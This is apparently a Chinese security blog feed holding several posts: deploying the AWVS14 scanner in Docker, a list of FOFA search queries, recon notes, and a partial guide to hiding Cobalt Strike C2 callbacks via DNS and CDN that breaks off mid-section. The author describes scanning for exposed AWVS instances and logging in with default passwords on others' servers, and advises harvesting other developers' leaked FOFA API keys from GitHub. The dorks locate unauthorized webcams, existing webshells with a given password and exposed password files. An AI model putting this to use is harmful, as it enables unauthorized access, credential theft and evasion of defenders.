Dokcer环境部署"></a>AWVS14 Dokcer环境部署</h2><p>查找镜像</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">docker search awvs<br></code></pre></td></tr></table></figure><p><img src="/AWVS14_Tips/2.png" alt="2"></p><p>这里就随便找一个，安装一个最近更新的，<code>xrsec/awvs</code>，看看它的介绍</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>hub.docker.com<span class="hljs-regexp">/r/</span>xrsec/awvs<br></code></pre></td></tr></table></figure><p><img src="/AWVS14_Tips/3.png" alt="3"></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">地址：https:<span class="hljs-comment">//you_ip:3443</span><br>账号：<span class="hljs-symbol">awvs@</span>awvs.com<br>密码：<span class="hljs-symbol">Awvs@</span>awvs.com<br></code></pre></td></tr></table></figure><p>拉取镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker pull xrsec/awvs<br></code></pre></td></tr></table></figure><p><img src="/AWVS14_Tips/4.png" alt="4"></p><p>run docker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -it -d --name awvs -p 3443:3443 xrsec/awvs<br></code></pre></td></tr></table></figure><p>登录扫描测试</p><p><img src="/AWVS14_Tips/5.png" alt="5"></p><p><img src="/AWVS14_Tips/6.png" alt="6"></p><p>AWVS14牛啊，就是有点慢，还是配合xray扫描快点</p><p><img src="/AWVS14_Tips/7.png" alt="7"></p><h2 id="有趣的来了"><a href="#有趣的来了" class="headerlink" title="有趣的来了"></a>有趣的来了</h2><p>当我安装完成后，发下这个awvs14 docker环境还挺多人下载的，我们安装完成docker环境一般都不会去改密码，大多数安装docker环境的都是再公网服务器上，缓解服务器压力挂着扫目标，这就会不会有弱口令，我找start最多数量的awvs14的docker环境试了试<code>secfa/docker-awvs</code>，还真有.</p><p>通过fofa证书查找，看相同镜像的服务器</p><p><img src="/AWVS14_Tips/8.png" alt="8"></p><p><img src="/AWVS14_Tips/9.png" alt="9"></p><p>写了个脚本跑了一下，还算蛮多弱口令的，</p><p><img src="/AWVS14_Tips/10.png" alt="10"></p><p><img src="/AWVS14_Tips/11.png" alt="11"></p><p>这个弱口令危害还是蛮大的，当我们的awvs服务器有弱口令，其他人登录了我们的服务器，其一我们的目标漏洞可能就泄露了，其二如果别人用我们的AWVS扫描敏感站点，如果敏感站点溯源到了你的服务器，你就哦豁了，如果是放在公网的AWVS服务器还是尽快更改密码吧！！！！！</p>]]></content>
    
    
    <categories>
      
      <category>工具分享</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
      <tag>笔记</tag>
      
      <tag>工具教程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>域前置上线隐藏</title>
    <link href="/2021/06/20/%E5%9F%9F%E5%89%8D%E7%BD%AE%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/"/>
    <url>/2021/06/20/%E5%9F%9F%E5%89%8D%E7%BD%AE%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/</url>
    
    <content type="html"><![CDATA[<span id="more"></span>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>fofa_Tips</title>
    <link href="/2021/06/10/fofa_Tips/"/>
    <url>/2021/06/10/fofa_Tips/</url>
    
    <content type="html"><![CDATA[<p><img src="/fofa_Tips/sao.png" alt="sao"></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>  最近应为一些事情，导致没时间写文章，公众也没就更新，微信公众上面的fofa_Tips邀请码也过期了，还没有改，不过还是有很多朋友加我微信来加群，以后如果fofa_Tips的二维码过期了们可以加我微信，我邀请你进群。</p><span id="more"></span><p>  现在事情解决了，可以专心来运营公众号了，以后会，多多分享，一些好用的工具推荐和渗透经验，漏洞复现文章。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>今天分享一个白嫖FOFA会员的Tips</p><p><img src="/fofa_Tips/1.png" alt="1"></p><p>可以到GitHub上搜索fofa key的关键字<strong>fofa_api</strong>、<strong>fofa_key</strong>、<strong>fofa_email</strong>就能找到，一些开发者，忘记在程序中删除的fofa api key，上面有的key有用有的可能更新了api key</p><p><img src="/fofa_Tips/2.png" alt="1"></p><p><img src="/fofa_Tips/3.png" alt="3"></p><p>再分享一下，fofa上有趣的搜索语句，以下语句摘录自白帽汇官方公众号的活动：搜集FOFA的有趣搜索语句</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Shadowsocks-Manager登录界面:<br><br><span class="hljs-attribute">body</span>=<span class="hljs-string">&quot;indeterminate&quot;</span> &amp;&amp; <span class="hljs-attribute">body</span>=<span class="hljs-string">&quot;MainController&quot;</span> &amp;&amp; <span class="hljs-attribute">header</span>=<span class="hljs-string">&quot;X-Powered-By: Express&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">供暖监控系统:</span><br><br>body=<span class="hljs-string">&quot;s1v13.htm&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">body</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;admin&quot;</span> server<span class="hljs-operator">=</span><span class="hljs-string">&quot;tomcat&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">获取免费的代理池:</span><br><br>body=<span class="hljs-string">&quot;get all proxy from proxy pool&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">body</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;miner start&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">一些蜜罐:<br><br>(<span class="hljs-attribute">header</span>=<span class="hljs-string">&quot;uc-httpd 1.0.0&quot;</span> &amp;&amp; <span class="hljs-attribute">server</span>=<span class="hljs-string">&quot;JBoss-5.0&quot;</span>) || <span class="hljs-attribute">server</span>=<span class="hljs-string">&quot;Apache,Tomcat,Jboss,weblogic,phpstudy,struts&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">阿里云某网段Webshell:</span><br><br>body=<span class="hljs-string">&quot;webshell -&gt; http://&#123;ip&#125;:&#123;port&#125;/?cmd=ifconfig&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">未授权访问摄像头:</span><br><br>app=<span class="hljs-string">&quot;webcamXP&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sas">疫情监控防控系统:<br><br><span class="hljs-keyword">title</span>=<span class="hljs-string">&quot;疫情&quot;</span> <span class="hljs-variable">&amp;&amp;</span>(<span class="hljs-keyword">title</span>=<span class="hljs-string">&quot;防控&quot;</span>||<span class="hljs-keyword">title</span>=<span class="hljs-string">&quot;监控&quot;</span>) <span class="hljs-variable">&amp;&amp;</span> country=<span class="hljs-string">&quot;CN&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">此语法可以查询到被挂黑的站点，紧张刺激:</span><br><br>body=<span class="hljs-string">&quot;hacked by&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">GitHub域名接管:</span><br><br>title=<span class="hljs-string">&quot;Site not found · GitHub Pages&quot;</span> &amp;&amp; server==<span class="hljs-string">&quot;cloudflare&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada">这是一个批量上传的webshell，使用密码“r00ts”即可登录，这些目录中还会包含大量的批量上传的木马文件，可供大家进行研究分析:<br><br><span class="hljs-keyword">body</span>=<span class="hljs-string">&quot;x.aspx&quot;</span> &amp;&amp; <span class="hljs-keyword">body</span>=<span class="hljs-string">&quot;asp&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">各种机场登录注册:</span><br><br>body=<span class="hljs-string">&quot;UA-111801619-3&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">搜索邮件配置文件:</span><br><br>body=“intitle:<span class="hljs-string">&quot;index of&quot;</span> squirrelmail/”<br></code></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">批量上传的一句话后门，某些后门密码比较简单，并且密码都一样。这些服务器都有一定的漏洞，比如IIS上传等，并且以企业测试服务器居多，可能包含企业内部数据，并且可以成为跳板进入企业内部网络:</span><br><br>body=<span class="hljs-string">&quot;asp;.jpg&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">能搜到很多html中明文显示的用户名密码的:<br><br><span class="hljs-attribute">body</span>=<span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; <span class="hljs-attribute">body</span>=<span class="hljs-string">&quot;123456&quot;</span> &amp;&amp; <span class="hljs-attribute">title</span>=<span class="hljs-string">&quot;登录&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs armasm">识别cobalt strike服务器，cobalt strike C/S架构的商业渗透软件，适合多人进行团队协作，可模拟APT做模拟对抗，进行内网渗透，是当前比较热门的一款<span class="hljs-built_in">C2</span>软件，无论是红蓝对抗(HW)，还是应急响应中，快速识别<span class="hljs-built_in">C2</span>服务器是重要的工作之一:<br><br><span class="hljs-symbol">header</span>=<span class="hljs-string">&quot;HTTP/1.1 404 Not Found Content-Type: text/plain Date:&quot;</span><span class="hljs-title">||</span>protocol=<span class="hljs-string">&quot;cobaltstrike&quot;</span><span class="hljs-title">||</span>cert=<span class="hljs-string">&quot;Serial Number: 146473198&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">app</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;Canon-网络摄像头&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">密码文件:<br><br>(<span class="hljs-attribute">body</span>=<span class="hljs-string">&quot;password.txt&quot;</span> || <span class="hljs-attribute">body</span>=<span class="hljs-string">&quot;密码.txt&quot;</span>) &amp;&amp; <span class="hljs-attribute">title</span>=<span class="hljs-string">&quot;index of&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">ss机场框架:</span><br><br>body=<span class="hljs-string">&quot;SSPanel-Uim&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">私服GM管理后台 一般都有默认密码，数据库弱口令，或者后门，注入:<br><br><span class="hljs-attribute">title</span>=<span class="hljs-string">&quot;GM管理后台&quot;</span> <span class="hljs-attribute">title</span>=<span class="hljs-string">&quot;传奇后台&quot;</span> <span class="hljs-attribute">body</span>=<span class="hljs-string">&quot;GM校验码&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">xray扫描结果:</span><br><br>title=<span class="hljs-string">&quot;X-Ray Report&quot;</span> || body=<span class="hljs-string">&quot;Powered by xray&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs hsp">vulscan 扫描框架:<br><br><span class="hljs-keyword">title</span>=<span class="hljs-string">&quot;vulscan&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">body</span>=<span class="hljs-string">&quot;选择区服&quot;</span> &amp;&amp; <span class="hljs-keyword">body</span>=<span class="hljs-string">&quot;充值&quot;</span> &amp;&amp; <span class="hljs-keyword">body</span>=<span class="hljs-string">&quot;后台&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">机场【科学上网】:<br><br>body=<span class="hljs-string">&quot;&lt;a href= &quot;</span>/staff\&quot;&gt;STAFF&lt;/a &gt;<span class="hljs-string">&quot; &amp;&amp; body=&quot;</span>&lt;a href=\&quot;/tos\&quot;&gt;<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sas">各种指挥系统的登录后台:<br><br><span class="hljs-keyword">title</span>=<span class="hljs-string">&quot;指挥&quot;</span> <span class="hljs-variable">&amp;&amp;</span> <span class="hljs-keyword">title</span>=<span class="hljs-string">&quot;登录&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada">查看看别人家搭建的蜜罐捕获攻击情况，红色的为攻击者，黄色的为蜜罐部署位置，看看哪个国家的肉鸡多~:<br><br><span class="hljs-keyword">body</span>=<span class="hljs-string">&quot;img/mhn_logo.png&quot;</span> &amp;&amp; <span class="hljs-keyword">body</span>=<span class="hljs-string">&quot;world-map&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">社工库:<br><br><span class="hljs-attribute">title</span>==&quot;社工库&quot; || ((<span class="hljs-attribute">title</span>=<span class="hljs-string">&quot;社工库&quot;</span> &amp;&amp; <span class="hljs-attribute">title</span>=<span class="hljs-string">&quot;系统&quot;</span>) ||(<span class="hljs-attribute">title</span>==&quot;社工库查询&quot; ))<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">该后台为逆苍穹游戏私服运营管理后台，如果存在<span class="hljs-regexp">/action/</span>api_show.php该文件 则密码为value的一句话木马后门:<br><br>body=<span class="hljs-string">&quot;网站管理员登陆&quot;</span> &amp;&amp; port=<span class="hljs-string">&quot;8090&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">此语句搜索源代码等文件，可以修改rar部分，搜索自己需要的内容，也可根据文件类型进行筛选:</span><br><br>title=<span class="hljs-string">&quot;Index of&quot;</span> &amp;&amp; body=<span class="hljs-string">&quot;rar&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">未授权的摄像头:</span><br><br>title=<span class="hljs-string">&quot;webcam 7&quot;</span>&amp;&amp;body=<span class="hljs-string">&quot;Live View&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">另类查找九安监控:</span><br><br>port=<span class="hljs-string">&quot;600001&quot;</span> &amp;&amp; body=<span class="hljs-string">&quot;login_chk_usr_pwd&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">路由设备登陆界面:</span><br><br>title==<span class="hljs-string">&quot;欢迎使用RippleOS&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">该语法可直接访问到任意使用python3.6.3、3.6.8、3.7.X搭建的简易服务器，然后可以直接访问甚至下载其服务器所有展示内容（毕设Demo、内部测试Demo、源码测试、电影图片XX、相册<span class="hljs-built_in">..</span>.）:<br><br>(<span class="hljs-attribute">server</span>=<span class="hljs-string">&quot;SimpleHTTP/0.6 Python/3.6.3&quot;</span> || <span class="hljs-attribute">server</span>=<span class="hljs-string">&quot;SimpleHTTP/0.6 Python/3.6.8&quot;</span> || <span class="hljs-attribute">server</span>=<span class="hljs-string">&quot;SimpleHTTP/0.6 Python/3.7.0&quot;</span> || <span class="hljs-attribute">server</span>=<span class="hljs-string">&quot;SimpleHTTP/0.6 Python/3.7.1&quot;</span> || <span class="hljs-attribute">server</span>=<span class="hljs-string">&quot;SimpleHTTP/0.6 Python/3.7.2&quot;</span> || <span class="hljs-attribute">server</span>=<span class="hljs-string">&quot;SimpleHTTP/0.6 Python/3.7.3&quot;</span> || <span class="hljs-attribute">server</span>=<span class="hljs-string">&quot;SimpleHTTP/0.6 Python/3.7.4&quot;</span> || <span class="hljs-attribute">server</span>=<span class="hljs-string">&quot;SimpleHTTP/0.6 Python/3.7.5&quot;</span> || <span class="hljs-attribute">server</span>=<span class="hljs-string">&quot;SimpleHTTP/0.6 Python/3.7.6&quot;</span>) &amp;&amp; <span class="hljs-attribute">title</span>=<span class="hljs-string">&quot;Directory listing for&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada">也许是用户量最大的xss系统:<br><br><span class="hljs-keyword">body</span>=<span class="hljs-string">&quot;tmp_downloadhelper_iframe&quot;</span> &amp;&amp; <span class="hljs-keyword">body</span>=<span class="hljs-string">&quot;mr_15&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">body</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;直播测试&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">关于情报中心的网站内容:</span><br><br>title=<span class="hljs-string">&quot;情报中心&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">weblogic:</span><br><br>port=<span class="hljs-string">&quot;7001&quot;</span> &amp;&amp; app=<span class="hljs-string">&quot;Weblogic_interface_7001&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada">不用翻墙的Google:<br><br>titile=<span class="hljs-string">&quot;Burp Suite&quot;</span> ＆＆ <span class="hljs-keyword">body</span>=<span class="hljs-string">&quot;Proxy History&quot;</span> 未授权burp <span class="hljs-keyword">body</span>= <span class="hljs-string">&quot;var c = Array.prototype.slice.call(arguments, 1):return function() &#123;var d=c.slice();&quot;</span><br></code></pre></td></tr></table></figure><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><p><a href="https://tp.wjx.top/m/59761097.aspx">https://tp.wjx.top/m/59761097.aspx</a></p><p><a href="https://tp.wjx.top/m/63242496.aspx">https://tp.wjx.top/m/63242496.aspx</a></p><p><a href="https://tp.wjx.top/m/67114073.aspx">https://tp.wjx.top/m/67114073.aspx</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>知识分享</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透资产信息收集</title>
    <link href="/2021/06/10/%E6%B8%97%E9%80%8F%E8%B5%84%E4%BA%A7%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <url>/2021/06/10/%E6%B8%97%E9%80%8F%E8%B5%84%E4%BA%A7%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<p><img src="/%E6%B8%97%E9%80%8F%E8%B5%84%E4%BA%A7%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/sao.png" alt="sao"></p><span id="more"></span><p>资产整合，ip,url,批量扫SERVER，Domain，</p><p>服务器常见，协议漏洞，弱口令，0day，配置错误漏洞，未授权漏洞</p><p>Domain：web服务器，cms扫描，urlpath爆破，js信息正则筛选收集，常见cms漏洞批量，0day，弱口令</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>渗透信息收集</title>
    <link href="/2021/06/10/%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <url>/2021/06/10/%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<p><img src="/%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/sao.png" alt="sao"></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>信息收集，对于我们做渗透而言，就相当于是战前的军事储存，你信息收集的多少，决定你此次渗透成功的概率（就算了运气好，也是信息收集的全面，才会有弱口令，常见框架漏洞可以利用）</p><p>对于信息收集，我打算做两篇文章来写，一篇写，渗透信息收集，一篇写，渗透资产收集，！</p><span id="more"></span><h2 id="信息收集思路"><a href="#信息收集思路" class="headerlink" title="信息收集思路"></a>信息收集思路</h2><p>公司信息，招标信息，上下游，供应链公司，主要责任人，真实ipb段，</p><h2 id="网络搜索引擎"><a href="#网络搜索引擎" class="headerlink" title="网络搜索引擎"></a>网络搜索引擎</h2><h3 id="Google，Baidu-Bing"><a href="#Google，Baidu-Bing" class="headerlink" title="Google，Baidu,Bing"></a>Google，Baidu,Bing</h3><p>Shodan,Zoomeye,Fofa</p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CobaltStrike上线隐藏</title>
    <link href="/2021/06/09/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/"/>
    <url>/2021/06/09/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/</url>
    
    <content type="html"><![CDATA[<p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/sao.png" alt="sao"></p><h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>话接上篇，上篇写了cs的常见特征隐藏，这次来讲解下，几种木马上线，常见的隐藏方法，其中有代理转发上线，DNS上线，CDN上线，域前置上线，云函数上线。</p><span id="more"></span><p>其中域前置上线，通过 这种方法需要厂商的支持，早些时候的amazon和google云都支持，后来取消了。随后cloudflare也取消了域前置的支持，目前国内的aliyun是支持的，曾经ali的cdn绑定域名不需要校验，可以随意绑定域名，实现高可信度域名绑定，现在则添加了域名验证， 不太好设置，如果想看，可以到我的博客中查看。</p><p>咱们这次就介绍三种常用的上线方式，DNS、CDN、云函数上线</p><h2 id="2-DNS上线"><a href="#2-DNS上线" class="headerlink" title="2 DNS上线"></a>2 DNS上线</h2><ol><li>一般我们拿到的shell都是，对出网有限制的，一般只能DNS出网，这时候就要用到我们 DNS 协议建立 C2 通信。，一般waf不会分析DNS流量，这一点也是能够隐蔽的特性。</li><li>DNS_TXT隧道传输：控制端发送的对目标的操作命令被加密后通过DNS的TXT记录里，通过DNS隧道传输隐蔽性较强不易被发现，但传输速度非常慢。</li></ol><h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><ol><li>需要准备一个不需要备案的域名</li><li>国外vps</li></ol><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><h4 id="域名注册"><a href="#域名注册" class="headerlink" title="域名注册"></a>域名注册</h4><ol><li><p>想白嫖域名可以到<strong>freenom.com</strong>注册一个免费且不用备案的的域名，但是我重来没用成功过。</p></li><li><p>趣域网可以代购国外域名，<strong>quyu.net</strong>购买一个不需要备案的域名</p></li></ol><h4 id="DNS记录配置"><a href="#DNS记录配置" class="headerlink" title="DNS记录配置"></a>DNS记录配置</h4><p>当注册好域名后，我们就要来配置dns了，创建A记录对应IP为VPS的IP，创建NS记录，解析地址为A记录的域名</p><p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/1.png" alt="1"></p><p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/2.png" alt="2"></p><p>设置完成后，pingA记录域名验证是否能够解析</p><p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/3.png" alt="3"></p><h4 id="CS的Listeners配置"><a href="#CS的Listeners配置" class="headerlink" title="CS的Listeners配置"></a>CS的Listeners配置</h4><p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/4.png" alt="4"></p><p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/5.png" alt="5"></p><p>上线之后是个小黑屏，使用<code>checkin</code>命令让dns beacon强制回连teamserver，并输入命令 <code>mode dns-txt</code>使传输的数据更多一些。</p><p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/6.png" alt="6"></p><h2 id="3-CDN上线"><a href="#3-CDN上线" class="headerlink" title="3 CDN上线"></a>3 CDN上线</h2><p>CDN的IP是多个域名共用的，为了做到精确判断，CDN会解析我们的<strong>host</strong>头，根据这样的方式进行判断通信域名，这样我们设置上线IP设置为CDN服务器的IP，<strong>host</strong>设置为我们的DNS，达到隐藏IP的需求</p><h4 id="前期准备-1"><a href="#前期准备-1" class="headerlink" title="前期准备"></a>前期准备</h4><ol><li>CDN服务器，可以选择CloudFlare，amazon，google，tencent，aliyun，都可</li><li>免备案域名，参考上一节</li><li>国外vps服务器，可以选择Vultr之类的，实在没用就用国内的也行</li></ol><h4 id="正文-1"><a href="#正文-1" class="headerlink" title="正文"></a>正文</h4><h5 id="CDN服务器注册"><a href="#CDN服务器注册" class="headerlink" title="CDN服务器注册"></a>CDN服务器注册</h5><ol><li>想白嫖的可以去CloudFlare注册申请免费CDN加速</li><li>腾讯云，也可以白嫖6个月的免费CDN加速</li></ol><h5 id="配置CND服务器"><a href="#配置CND服务器" class="headerlink" 